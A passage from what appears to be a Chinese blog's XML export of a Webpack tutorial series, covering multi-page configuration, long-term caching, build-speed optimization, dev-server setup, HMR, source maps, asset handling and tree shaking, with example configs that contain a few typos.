webpack.config.js 多页面单配置 webpack.conf.single.js和多配置几乎一样，不过仅仅通过merge合并配置，输出一份多entry的配置而已123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102const merge = require(&apos;webpack-merge&apos;)const webpack = require(&apos;webpack&apos;)const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;)const CleanWebpack = require(&apos;clean-webpack-plugin&apos;)const ExtractTextWebpackPlugin = require(&apos;extract-text-webpack-plugin&apos;)const path = require(&apos;path&apos;)// 基本公共配置const baseConfig = &#123; entry: &#123; react: &apos;react&apos; &#125;, output: &#123; path: path.resolve(__dirname, &apos;dist&apos;), filename: &apos;js/[name].[chunkhash].js&apos; &#125;, module: &#123; rules: [ &#123; test: /\.css$/, use: ExtractTextWebpackPlugin.extract(&#123; fallback: &apos;style-loader&apos;, use: &apos;css-loader&apos; &#125;) &#125; ] &#125;, plugins: [ new ExtractTextWebpack(&#123; filename: &apos;css/[name].[hash].css&apos; &#125;), new CleanWebpack(path.resolve(__dirname, &apos;dist&apos;)), new webpack.optimize.CommonsChunkPlugin(&#123; name: &apos;react&apos;, minChunks: Infinity &#125;) ]&#125;// 定义函数，帮助我们生成每一个页面（入口）的配置const generatePage = function (&#123; title = &apos;&apos;, entry = &apos;&apos;, template = &apos;./src/index.html&apos;, name = &apos;&apos;, chunks = []&#125; = &#123;&#125;) &#123; // 返回配置 return &#123; entry, plugins: [ new HtmlWebpackPlugin(&#123; chunks, // 生成html的模板 template, // 我们要生成页面的名称 filename: name + &apos;.html&apos; &#125;) ] &#125;&#125;const pages = [ generatePage(&#123; title: &apos;page A&apos;, entry: &#123; a: &apos;./src/pages/a&apos; &#125;, name: &apos;a&apos;, chunks: [&apos;react&apos;, &apos;a&apos;] &#125;), generatePage(&#123; title: &apos;page B&apos;, entry: &#123; b: &apos;./src/pages/b&apos; &#125;, name: &apos;b&apos;, chunks: [&apos;react&apos;, &apos;b&apos;] &#125;), generatePage(&#123; title: &apos;page C&apos;, entry: &#123; c: &apos;./src/pages/c&apos; &#125;, name: &apos;c&apos;, chunks: [&apos;react&apos;, &apos;c&apos;] &#125;),]// 和基础配置merge，生成最终配置// 区别于多配置，在我们输出时，将所有的配置合并为一个输出，而不是输出一个包含多份配置的数组module.exports = merge(baseConfig.concat(pages))// 此时引用的公共库react会打包出一个，而不像多配置一样打包出3个// 实现了公共代码的共享]]></content>
      <categories>
        <category>深入浅出Webpack</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出Webpack（十三）-长缓存优化]]></title>
    <url>%2F2018%2F02%2F22%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAWebpack%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89-%E9%95%BF%E7%BC%93%E5%AD%98%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[场景一一般项目代码分为两部分，一部分为app（业务）代码，一部分为（第三方库）vendor代码。 解决长缓存问题 提取vendor hash -&gt; chunkhash，打包hash并不是代码块hash，将hash值变为代码块hash，作为版本号，解决缓存问题。 提取 webpack runtime 代码（一） 此时打包出来的chunk，main文件和vendor文件的hash值是一样的。 此时大小不正常，因为我们没有将vendor作为公共代码提取出来1234567891011module.exports = &#123; entry: &#123; main: &apos;./src/foo&apos;, // 多入口分离第三方库 vendor: [&apos;react&apos;] &#125;, output: &#123; path: path.resolve(__dirname, &apos;dist&apos;), filename: &apos;[name].[hash].js&apos; &#125;&#125; 代码（二） CommonsChunkPlugin提取公共代码。 两个文件的hash值是一样的。1234567891011121314151617module.exports = &#123; entry: &#123; main: &apos;./src/foo&apos;, // 多入口分离第三方库 vendor: [&apos;react&apos;] &#125;, output: &#123; path: path.resolve(__dirname, &apos;dist&apos;), filename: &apos;[name].[hash].js&apos; &#125;, plugins: [ new webpack.optimize.CommonsChunkPlugin(&#123; name: &apos;vendor&apos;, minChunks: Infinity &#125;) ]&#125; 代码（三） 使用chunkhash 打包，此时文件的hash值不同 但是，修改代码，再次打包，此时没有修改vendor，vendor的hash值还是会变化 因为vendor中包含了webpack自己生成的代码，每次编译都会改变。1234567891011121314151617module.exports = &#123; entry: &#123; main: &apos;./src/foo&apos;, // 多入口分离第三方库 vendor: [&apos;react&apos;] &#125;, output: &#123; path: path.resolve(__dirname, &apos;dist&apos;), filename: &apos;[name].[chunkhash].js&apos; &#125;, plugins: [ new webpack.optimize.CommonsChunkPlugin(&#123; name: &apos;vendor&apos;, minChunks: Infinity &#125;) ]&#125; 代码（四） 提取webpack自己生成的代码 此时修改代码，vendor hash值不变，main hash值变化, manifest hash值变化1234567891011121314151617181920module.exports = &#123; entry: &#123; main: &apos;./src/foo&apos;, // 多入口分离第三方库 vendor: [&apos;react&apos;] &#125;, output: &#123; path: path.resolve(__dirname, &apos;dist&apos;), filename: &apos;[name].[chunkhash].js&apos; &#125;, plugins: [ new webpack.optimize.CommonsChunkPlugin(&#123; name: &apos;vendor&apos;, minChunks: Infinity &#125;)， new webpack.optimize.CommonsChunkPlugin(&#123; name: &apos;manifest&apos; &#125;) ]&#125; 场景二引入新模块，模块顺序变化，vendor hash还是变化了为什么？ webpack打包时，会为每个chunk相应的id。id发生变化时，响应的hash值也会变化。所以我们要为chunk使用名字而不是id。 为chunk命名 代码 123456789101112131415161718192021module.exports = &#123; entry: &#123; main: &apos;./src/foo&apos;, // 多入口分离第三方库 vendor: [&apos;react&apos;] &#125;, output: &#123; path: path.resolve(__dirname, &apos;dist&apos;), filename: &apos;[name].[chunkhash].js&apos; &#125;, plugins: [ new webpack.NamedChunksPlugin(), new webpack.optimize.CommonsChunkPlugin(&#123; name: &apos;vendor&apos;, minChunks: Infinity &#125;)， new webpack.optimize.CommonsChunkPlugin(&#123; name: &apos;manifest&apos; &#125;) ]&#125; 此时，vendor hash值不变，而 manifest 和 main 的hash值发生变化了。 说明，为chunk给一个确定的命名而不是由webpack随机取值，可以固定hash。 为module命名12345678910111213141516171819202122module.exports = &#123; entry: &#123; main: &apos;./src/foo&apos;, // 多入口分离第三方库 vendor: [&apos;react&apos;] &#125;, output: &#123; path: path.resolve(__dirname, &apos;dist&apos;), filename: &apos;[name].[chunkhash].js&apos; &#125;, plugins: [ new webpack.NamedChunksPlugin(), new webpack.NamedModulesPlugin(), new webpack.optimize.CommonsChunkPlugin(&#123; name: &apos;vendor&apos;, minChunks: Infinity &#125;)， new webpack.optimize.CommonsChunkPlugin(&#123; name: &apos;manifest&apos; &#125;) ]&#125; 此时修改代码，vendor hash值不变，manifest hash值改变，main hash值改变。 场景三：动态引入模块，vendor hash值会变化此时，我们需要定义动态chunk的name1import(/* webpackChunkName: &apos;moduleA&apos;*/&apos;./moduleA&apos;).then() 总结 独立打包vendor 抽出manifest(webpack runtime)，webpack runtime代码在打包的时候会变化，造成hash值的改变。可以再结合之前inline HTML的优化，将这部分代码直接inline到我们的html中。 使用 NamedChunksPlugin NamedModulesPlugin，确定chunk的id，而不是使用webpack随机分配的数字id，从而造成可能的hash变化。 动态模块给定模块名称。 这样在发布时，可以保证版本号不再变化，保证缓存。]]></content>
      <categories>
        <category>深入浅出Webpack</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出Webpack（十二）-Webpack打包分析及打包速度优化]]></title>
    <url>%2F2018%2F02%2F22%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAWebpack%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89-Webpack%E6%89%93%E5%8C%85%E5%88%86%E6%9E%90%E5%8F%8A%E6%89%93%E5%8C%85%E9%80%9F%E5%BA%A6%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[打包分析工具 Offical Anylyse Tool：针对chunk进行分析，并给出一定的建议。 webpack-bundle-analyzer：可视化模块打包过程。 Offical Anylyse Tool 命令行：webpack –profile –json &gt; stats.json：所有的打包信息都会在json文件中。 http://webpack.github.io/analyse/ 上传打包结果，官方会更加友好的反馈打包信息，提供建议。我们可以根据建议进行一个优化。 webpack-bundle-analyzer 插件：BundleAn alyzerPlugin 命令行：webpack-bundle-analyzer stats.json 通过命令行分析Offical Anylyse Tool生成的json文件。 打包结果分析 webpack打包后会在命令行输出一定的打包信息。每个chunk有唯一的chunk Id，有唯一的module Id，以及针对性的命名chunkName。 引入插件下的plugin1var BundleAnalyzerPlugin = require(&apos;webpack-bundle-analyzer&apos;).BundleAnalyzerPlugin() 123plugins: [ new BundleAnalyzerPlugin()] 再次打包后，浏览器会弹出打包分析页面。 有时我们会发现我们的多个bundle中，会出现相同的模块。这就说明，我们没有作公共模块的提取。我们就可以进行针对性的配置。 因此，打包分析可以帮助我们调整打包的策略。 优化打包速度 文件多：随着项目的复杂度提高，文件数增加，打包速度会越来会慢，甚至会耗费大量时间。 依赖多：Webpack进行大量的语法分析。 页面多：业务逻辑多。 方法一 分开vendor（第三方代码） 和 app（业务代码）。第三方代码基本不修改，对于没有修改的代码，不去打包。 DLLPlugin和DLLReferencePlugin，专门打包第三方代码。插件会生成map（映射关系），在打包业务代码的时候，碰到了第三方代码，会引用这个映射关系。即告诉Webpack，这个第三方库我已经打包好了，你不需要打包，直接引用即可。 这样，就可以大大节约打包第三方库的时间。 方法二 UglifyJsPlugin会对代码进行压缩和混淆，耗时巨大，限定它的工作范围。 parallel为true时，将串行任务变成并行，进行多任务打包。 缓存 方法三 HappyPack 将串行的loader成为并行 HappyPack.ThreadPool 方法四 babel-loader，编译耗时大 options.cacheDirectory，将babel的缓存开启。 通过include和exclude，规定我们的打包范围。 其它 减少resolve，当resolve过多，会增加webpack的查找时间。 Devtool: 去除sourcemap。生成sourcemap也会增加webpack的打包时间。 cache-loader：缓存所有的处理结果。 升级node和升级webpack。 实战优化打包速度：使用DLL分离第三方代码和业务代码的打包 使用vue-cli快速初始化项目环境 打包 引入第三方库（elment-ui）以后，webpack打包时间会明显增加。 打包 引入dll打包公共库 在build目录下新建文件 webpack.dll.conf.js 123456789101112131415161718192021222324252627282930const path = require(&apos;path&apos;)const webpack = require(&apos;webpack&apos;)module.exports = &#123; entry: &#123; vue: [&apos;vue&apos;, &apos;vue-router&apos;], ui: [&apos;element-ui&apos;] &#125;, // 不直接输出在dist目录下，因为dist目录在打包前都会被删除 // 我们希望第三方代码可以持续的使用 output: &#123; // 输出在src下的dll目录下 path: path.join(__dirname, &apos;../src/dll/&apos;), filename: &apos;[name].dll.js&apos;, // 定义引用者如何使用第三方库，一般直接定义为全局变量 library: &apos;[name]&apos; &#125;, plugins: [ new webpack.DllPlugin(&#123; // 不放在dist目录下，因为每次打包前都会删除 path: path.join(__dirname, &apos;../src/dll/&apos;, &apos;[name]-manifest.json&apos;), name: &apos;[name]&apos; &#125;), // 至此，上述内容告诉了webpack如何打包dll new webpack.optimize.UglifyJsPlugin() ]&#125; 打包后，生成dll文件。 ui.dll.js、ui-manifest.json、vue.dll.js、vue-manifest.json 这两个json文件，告诉我们的业务webpack如何去引入我们打包为dll的第三方插件。在build下，webpack.prod.conf.js中的plugins中，使用DLLReferencePlugin 1234567plugins: [ new webpack.DllReferencePlugin(&#123; manifest: require(&apos;../src/dll/ui-manifest.json&apos;) &#125;), new webpack.DllReferencePlugin(&#123; manifest: require(&apos;../src/dll/vue-manifest.json&apos;) &#125;)] 此时，再次打包，打包时间大大降低。 实战优化打包速度：UglifyJsPlugin串行变并行，开启缓存 UglifyJsPlugin 的parallel为true，开启缓存 cache:true，去除source map12345678910new UglifyJsPlugin(&#123; uglifyOptions: &#123; compress: &#123; warnings: false &#125; &#125;, // sourceMap: config.build.productionSourceMap, parallel: true, cache: true&#125;), 实战优化打包速度：减少babel-loader的include范围12345&#123; test: /\.js$/, loader: &apos;babel-loader&apos;, include: [resolve(&apos;src&apos;), resolve(&apos;test&apos;), resolve(&apos;node_modules/webpack-dev-server/client&apos;)]&#125;, test和client是开发环境下使用的，为加速打包，我们去除12345&#123; test: /\.js$/, loader: &apos;babel-loader&apos;, include: [resolve(&apos;src&apos;)]&#125;, 实战优化打包速度：Happypack，loader串行变并行 base配置中 1234&#123; test: /\.vue$/, loader: &apos;happypack/loader?id=vue&apos;&#125;, prod配置中 1234567new Happypack(&#123; id: &apos;vue&apos;, loader: [&#123; loader: &apos;vue-loader&apos;, option: require(&apos;./vue-loader.conf&apos;) &#125;]&#125;), id为vue时，happypack使用vue-loader去处理相关文件。代码较小时，效果其实不明显。]]></content>
      <categories>
        <category>深入浅出Webpack</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出Webpack（十一）-区分开发与生产环境]]></title>
    <url>%2F2018%2F02%2F20%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAWebpack%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89-%E5%8C%BA%E5%88%86%E5%BC%80%E5%8F%91%E4%B8%8E%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[开发环境与生产环境的配置不同开发环境 模块热更新：需要开发环境能够更敏捷更快的响应我们本地代码的变更。 sourceMap：调试 接口代理：Proxy 代码检查：Eslint 生产环境 提取公用代码：为保证用户响应速度，需要让用户加载尽可能少的冗余代码。 压缩混淆：压缩代码体积，下载更快。 文件压缩或Base64。 tree shaking 去除无用代码。 开发环境与生产环境的配置共同点 同样的入口 同样的代码处理（loader处理） 同样的解析配置 如何区分开发和生产环境 webpack-merge：拼接webpack配置。 webpack.dev.conf.js：开发配置 webpack.prod.conf.js：生产配置 webpack.common.conf.js：公共配置 指定环境参数1webpack-dev-server --env development 为环境指定参数development，表明为开发环境。 1webpack-dev-server --env production 为环境指定参数production，表明为生产环境。 1234567const merge = require(&apos;webpack-merge&apos;)// 公共配置const generateConfig = env =&gt; &#123; return &#123; // 这里是公共配置 &#125;&#125; 1234module.exports = env =&gt; &#123; let config = env === &apos;production&apos; ? productionConfig : developmentConfig return merge(config, generateConfig(env))&#125; 此时我们根据环境参数env，选择相应的配置文件。 使用middleware搭建开发环境配合middleware可以更加自由方便的开发我们自己的dev-server。为我们的开发环境加入更多适合业务的环境编码。 依赖 Express or Koa webpack-dev-middleware webpack-hot-middleware http-proxy-middleware connect-history-api-fallback opn]]></content>
      <categories>
        <category>深入浅出Webpack</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出Webpack（十）-使用Webpack为开发提速]]></title>
    <url>%2F2018%2F02%2F20%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAWebpack%EF%BC%88%E5%8D%81%EF%BC%89-%E4%BD%BF%E7%94%A8Webpack%E4%B8%BA%E5%BC%80%E5%8F%91%E6%8F%90%E9%80%9F%2F</url>
    <content type="text"><![CDATA[Webpack Watch Mode（webapck监听文件变动）输入命令行 webpack -watch 或 webpack -w，启动webpackwebpack监听文件变化，但并不会提供一个http服务器 Webpack Dev Server 概述及路径相关配置live reloading 重刷新浏览器。 不能重新打包文件。Webpack Dev Server 执行的项目是存在其内存环境下的，其没有打包文件的功能。仍然需要Webpack的打包文件的功能。 路径重定向 项目的某些地址配的是线上地址，此时需要路径重定向。 https、浏览器中编译错误、接口代理（跨域）模块热更新不刷新浏览器，更新代码。 配置devServer（devServer的选项） inline contentBase：静态内容的路径，默认为当前工作的目录。 port historyApiFallback：使用HTML history。 https proxy，指定proxy代理远程接口。 hot，支持模块热更新，在某些事件中，通过web hook的方式替换代码，不触发浏览器更新。 openpage，指定webpack dev server 打开时的初始页面。 lazy，懒加载。多页面应用时，webpack-dev-server只加载webpack打包的对应页面的包，可以加快调试速度。 overlay，通过遮罩提供错误提示。 实战12345678910111213141516171819202122entry: &#123;&#125;，output: &#123;&#125;，devServer: &#123; // 为false时，访问地址为localhost:9001/webpack-dev-server，且会出现打包情况的提示 inline: true, // 端口 port: 9001, // 使用history Api，却没有相应的文件便会404。 // true，任何路径都会返回index.html的资源文件 historyApiFallback: true, // 或 有更多强大配置 // 当路径为/pages/a，返回本地/pages/a.html，也可以写function或者正则 historyApiFallback: &#123; rewrites: [ from: &apos;/pages/a&apos;, to: &apos;/pages/a.html&apos; ] &#125;&#125;,resolve: &#123;&#125;,module: &#123;&#125;,plugins: &#123;&#125; 一些注意点 webpack的ouput配置，publicPath属性是针对于打包完成后的线上环境，静态文件的根路径。 Proxy（内置了http-proxy-middleware）通过node服务器代理本地的接口请求，将拿取的结果返回给本地使用。 参数解析 target：指定你代理的地址。 changeOrigin: 改变你的源到你指定的url。 headers: 给你代理的请求增加头。 logLevel：命令行工具中，显示代理情况。 pathRewrite：帮助你重定向接口请求。 实战12345678910111213141516171819202122232425262728entry: &#123;&#125;，output: &#123;&#125;，devServer: &#123; inline: true, port: 9001, historyApiFallback: true, proxy: &#123; // 如果请求是api开头的，我们将它指向 https://m.weibo.cn &apos;/api&apos;: &#123; target: &apos;https://m.weibo.cn&apos;， // 改变跨域请求中header的源信息（origin字段） changeOrigin: true, // 在控制台中看到我们代理的信息 logLevel: &apos;debug&apos;， // 为proxy配置重定向规则 pathRewrite: &#123; // 代码请求comments 会代理到 /api/comments // 注意这里的路径配置和外层的路径配置是相互关联的，此时匹配的是/api/comments。 &apos;^/comments&apos;: &apos;/api/comments&apos; &#125;, // 当需要为请求头添加信息时 headers: &#123;&#125; &#125; &#125;&#125;,resolve: &#123;&#125;,module: &#123;&#125;,plugins: &#123;&#125; Module Hot Reloading(模块热更新) 保持应用的数据状态 节省调试时间 模块热更新需要额外的代码，但是我们的loader已经为我们考虑到了。例如：style-loader会为我们自动加入模块热更新所需要的代码。框架的loader也会为我们自动加入模块热更新所需要的代码。 但是一些我们自己写的原生的代码，就需要自己加入模块热更新所需要的hook了。 实战12345678910111213141516171819entry: &#123;&#125;，output: &#123;&#125;，devServer: &#123; inline: true, port: 9001, historyApiFallback: true, proxy: &#123;&#125;， hot: true, // 不使用刷新浏览器进行热更新 hotOnly: true&#125;,resolve: &#123;&#125;,module: &#123;&#125;,plugins: &#123;[ // 添加模块热更新 new webpack.HotModuleReplacementPlugin(), // 当开启 HMR 的时候使用该插件会显示模块的相对路径 new webpack.NameModulesPlugin()]&#125; 在业务代码中12345// 当js代码改变时，告诉我们需要热更行// 当./a文件更新时，执行回调if (module.hot) &#123; module.hot.accept(&apos;./a&apos;, callback)&#125; Source Map 代码调试现代开发，大多数的代码是经过编译转换的。source map 将你编译的代码与你本地的代码做一个映射。 插件 Devtool，配置不同的source map webpack.SourceMapDevToolPlugin webpack.EvalSourceMapDevToolPlugin development环境下的配置 eval source-map cheap-eval-source-map cheap-module-eval-source-map Production环境下的配置 source-map hidden-source-map nosource-source-map loader的source.map配置 css-loader.option.sourcemap less-loader.opton.sourcemap sass-loader.option.sourcemap JS代码的uplify的sourcemap 实战devtool: ‘source-map’帮助我们定义到本地项目代码中具体的代码1234567entry: &#123;&#125;，output: &#123;&#125;，devServer: &#123;&#125;,resolve: &#123;&#125;,module: &#123;&#125;,plugins: &#123;&#125;,devtool: &apos;source-map&apos; 选择 开发时，我们需要编译的速度和快速定义错误的行。所以选择cheap-module-source-map 线上时，不需要编译速度，但需要清晰的定义错误。所以选择source-map。 Eslint 代码规范检查 eslint eslint-loader eslint-plugin-html：检测html中的js eslint-friendly-formatter：友好格式化的错误报警。 配置eslint webpack中增加eslint-loader 增加.eslintrc.* 文件 eslint-loader options.failOnWarning 警告则不允许编译 options.failOnError 报错则不允许编译 options.formatter 设置第三方友好地址 options.outputRepot 设置报告 记得将devServer.onverlay打开，便可以在浏览器看到编译提示错误]]></content>
      <categories>
        <category>深入浅出Webpack</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出Webpack（九）-文件处理]]></title>
    <url>%2F2018%2F02%2F19%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAWebpack%EF%BC%88%E4%B9%9D%EF%BC%89-%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%2F</url>
    <content type="text"><![CDATA[文件处理 图片 css中引入的图片 引入的图片优化快速加载2.1 自动合成雪碧图2.2 压缩图片2.3 较小的图片 base64编码 字体 第三方JS库 HTML 图片处理file-loader、url-loader、img-loader、postcss-sprites css中引入的图片 使用webpack打包CSS（CSS中包含图片资源文件）会报错，提示需要loader去处理图片资源。 在module的rules中添加file-loader去处理css依赖的图片文件。 通过options配置路径，文件会输出在dist/assets/imgs下。这里file-loader为background的url配置图片地址时，是会默认相对于css文件的地址进行配置的。通过publicPath:’’，让其配置地址是相对于根目录下的地址。 12345678910111213&#123; test: /\.(png|jpg|jpeg|gif)$/, use: [ &#123; loader: &apos;file-loader&apos;, options: &#123; publicPath: &apos;&apos;, outputPath: &apos;dist/&apos;, useRelativePath: true &#125; &#125; ]&#125; 较小的图片 base64编码当文件小于10kb，转为base64。当文件大于10kb，抽取出来。123456789&#123; loader: &apos;url-loader&apos;, options: &#123; limit: 100000, publicPath: &apos;&apos;, outputPath: &apos;dist/&apos;, useRelativePath: true &#125;&#125; img-loader 压缩图片图片会被压缩12345678910111213141516171819&#123; loader: &apos;url-loader&apos;, options: &#123; // 为插入的img指定名称 name: &apos;[name].min.[ext]&apos; limit: 100000, publicPath: &apos;&apos;, outputPath: &apos;dist/&apos;, useRelativePath: true &#125;&#125;,&#123; loader: &apos;img-loader&apos;, options: &#123; pngquant: &#123; quality: 80 &#125; &#125;&#125; postcss-sprites合成雪碧图 默认合成的图片都是在跟目录下，需要使用spritePath指定目录12345678910111213141516&#123; loader: &apos;postcss-loader&apos;, options: &#123; options: &#123; ident: &apos;postcss&apos;, plugins: [ require(&apos;postcss-sprites&apos;)(&#123; spritePath: &apos;dist/assets/imgs/sprites&apos;, // 对安卓和苹果图片做区分，如果图片以@2x结尾，例如niao@2x.png。那么postcss-sprites就能区分出来了。 retina: true &#125;), require(&apos;postcss-cssnext&apos;)() ] &#125; &#125;&#125; 字体处理url-loader，file-loader1234567891011121314test: /\.(eot|woff2|woff|ttf|svg)$/,use: [ &#123; loader: &apos;url-loader&apos;, options: &#123; // 为插入的img指定名称 name: &apos;[name].min.[ext]&apos; limit: 100000, publicPath: &apos;&apos;, outputPath: &apos;dist/&apos;, useRelativePath: true &#125; &#125;] 第三方JS库webpack.providePluginimports-loaderwindow 使用webpack.providePlugin 使用第三方库在webpack.config.js中的plugins123new webpack.ProvidePlugin(&#123; $: &apos;jquery&apos;&#125;) 因此，webpack.ProvidePlugin会为我们的代码中注入“$”，我们就可以使用$了。 使用webpack.providePlugin配合resolve使用本地库 假设jquery是我们的本地库 使用resolve功能 123456resolve: &#123; alias: &#123; // $符号表示将jquery别名是解析到某个目录的某个文件下，而不是整个目录 jquery$: path.resolve（__dirname, &apos;src/libs/jquery.min.js&apos;） &#125;&#125; 在webpack.config.js中的plugins 123new webpack.ProvidePlugin(&#123; $: &apos;jquery&apos;&#125;) 即webpack解析到jquery这个关键词时，会通过alias的别名系统，去对应的目录下找这个文件。 imports-loader这里imports-loader也可以和resolve中的alias配合使用，解析本地第三方库。1234567891011&#123; test: path.resolve(__dirname, &apos;src/app.js&apos;), use: [ &#123; loader: &apos;imports-loader&apos;, options: &#123; $: &apos;jquery&apos; &#125; &#125; ]&#125; HTML处理生成HTML HtmlWebpackPlugin: 根据给定的html模板，生成html文件。 options: template filename，指定文件名。 minify，是否压缩生成的html文件。 chunks，指定有几个entry chunk是加入到你的html页面中来的。例如：多页面应用，需要为各个页面生成html，且为各个页面插入相关的chunk。 inject，是否需要HtmlWebpackPlugin将你需要的标签插入到页面中。 实战以模板生成html文件1var HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;) 12345// 在plugin中new HtmlWebpackPlugin(&#123; filename: &apos;index.html&apos;, template: &apos;./index.html&apos;&#125;) 生成的index.html中，HtmlWebpackPlugin会为我们自动插入生成的js和css标签。 以模板生成html文件（不插入标签）123456// 在plugin中new HtmlWebpackPlugin(&#123; filename: &apos;index.html&apos;, template: &apos;./index.html&apos;， inject: false&#125;) 生成的index.html中，HtmlWebpackPlugin“不会”为我们自动插入生成的js和css标签。 以模板生成html文件（多entry） 不指定chunks，所有entry打包的文件都会插入html中 123456// 在plugin中new HtmlWebpackPlugin(&#123; filename: &apos;index.html&apos;, template: &apos;./index.html&apos;， chunks: []，&#125;) 指定chunks，仅entry相关的文件都会插入html中 在entry有key为app的入口文件，还有其它的入口文件。仅仅需要将名为app的插入html中。123456// 在plugin中new HtmlWebpackPlugin(&#123; filename: &apos;index.html&apos;, template: &apos;./index.html&apos;， chunks: [&apos;app&apos;]，&#125;) 以模板生成html文件,压缩123456789// 在plugin中new HtmlWebpackPlugin(&#123; filename: &apos;index.html&apos;, template: &apos;./index.html&apos;， chunks: [&apos;app&apos;]， minify: &#123; collapseWhitespace: true &#125;&#125;) HTML中引入的图片 html-loader，帮助webpack判断html文件中哪些元素需要交给webpack处理。 options: attrs: [img: src]，告诉webpack对html文件中元素的打包规则。 实战1234567891011&#123; test: /\.html$/, use: [ &#123; loader: &apos;html-loader&apos;, options: &#123; attrs: [&apos;img:src&apos;, &apos;img:data-src&apos;] &#125; &#125; ]&#125; 这样，img标签引用的src的图片会被抽出。 路径问题 url-loader启用了相对路径，这会带来路径问题。其实，我们只需要根据ouput中的path，再在url-loader中如此编写路径即可。 取消的相对路径，就应使用绝对路径。在output中使用publicPath。12345678910``` &#123; loader: &apos;url-loader&apos;, options: &#123; // 为插入的img指定名称 name: &apos;[name].min.[ext]&apos; limit: 100000, outputPath: &apos;assets/imgs/&apos; &#125; &#125; 在HTML中Webpack配合优化提前载入Webpack的加载代码 有时，我们直接将共用的JS代码直接插入html中以减少网络请求。 inline-manifest-webpack-plugin html-webpack-inline-chunk-plugin html-webpack-inline-chunk-plugin 引入插件 1var htmlInlineChunkPlugin = require(&apos;html-webpack-inline-chunk-plugin&apos;) 使用时，告诉htmlInlineChunkPlugin，我们希望直接插入html的chunk名称 告诉htmlInlineChunkPlugin，我们希望直接在html中插入Webpack自己的生产代码，之前我们已经通过插件抽出并命名为manifest。123new HtmlInlineChunkPlugin(&#123; inlineChunks: [&apos;manifest&apos;]&#125;)]]></content>
      <categories>
        <category>深入浅出Webpack</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出Webpack（八）-JS与CSS的Tree Shaking]]></title>
    <url>%2F2018%2F02%2F19%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAWebpack%EF%BC%88%E5%85%AB%EF%BC%89-JS%E4%B8%8ECSS%E7%9A%84Tree%20Shaking%2F</url>
    <content type="text"><![CDATA[Tree Shaking JS Tree Shaking CSS Tree Shaking 使用场景 常规优化。 引入第三方库的某一功能。 JS Tree Shaking不使用 tree shaking 未使用JS Tree Shaking时，Webpack打包后的代码，会通过注释进行一个分类。例如 function a () {}是被使用的，function b() {} 是未使用的。 打包后的代码是12/* harmony export a*/ function a () &#123;&#125;/* unused harmony export b*/ function b () &#123;&#125; 本地代码使用 tree shaking 在plugins中 1new Webpack.optimize.UglifyJsPlugin() 这样，Webpack会将打包的JS文件压缩优化，且将未使用的funtion b () {}摒弃打包。 第三方库lodash直接使用 tree shaking1import &#123;chunk&#125; from &apos;lodash&apos; 不使用tree shaking，整个lodash都会被Webpack打包。 直接单单在plugins中，此时打包的结果仍然较大。因为lodash文件本身便十分庞大，且它是一个立即执行函数，并不是按照模块化输出的。 1new Webpack.optimize.UglifyJsPlugin() 因此，安装一个lodash的es module即可。 第三方库lodash使用es-module，再使用 tree shaking1import &#123;chunk&#125; from &apos;lodash-es&apos; 再次使用插件UglifyJsPlugin，再次打包，tree shaking仍然没有生效。 第三方库的tree-shaking因此，如果第三方库没有使用标准的模块化方案，webpack的tree shaking是不能正确工作的。 第三方库lodash使用babel-plugin-lodash，再使用 tree shaking12345loader: &apos;babel-loader&apos;,options: [ presets: [&apos;env&apos;], plugins: [&apos;lodash&apos;]] 此时，对lodash的tree shaking成功。 CSS Tree Shaking Purify CSSpurifycss-webpack（推荐） optionspaths: 告诉 purifycss-webpack，你针对我提供的这些路径进行CSS Tree Shaking。 purifycss-webpack 实战 引入purify、glob-all 12var PurifyCSS = require(&apos;purifycss-webpack&apos;)var glob = require(&apos;glob-all&apos;) glob.sync（）同步获取目录下所有文件名 在webpack的plugins的配置中加入purify，且purify一定要放置在ExtractTextWebpackPlugin的后面。 123456789plugins: [ new ExtractTextWebpackPlugin(), new PurifyCSS(&#123; paths: glob.sync([ path.join(__dirname, &apos;./index.html&apos;), path.join(__dirname, &apos;./src/*.js&apos;) ]) &#125;)] 结果：有可能会报bug。但结果上，purify可以检测到需要的css代码（无论是标签上表明需要的css，还是js代码动态拼接使其需要的css），进行一个tree-shaking。]]></content>
      <categories>
        <category>深入浅出Webpack</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出Webpack（七）-处理CSS]]></title>
    <url>%2F2018%2F02%2F19%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAWebpack%EF%BC%88%E4%B8%83%EF%BC%89-%E5%A4%84%E7%90%86CSS%2F</url>
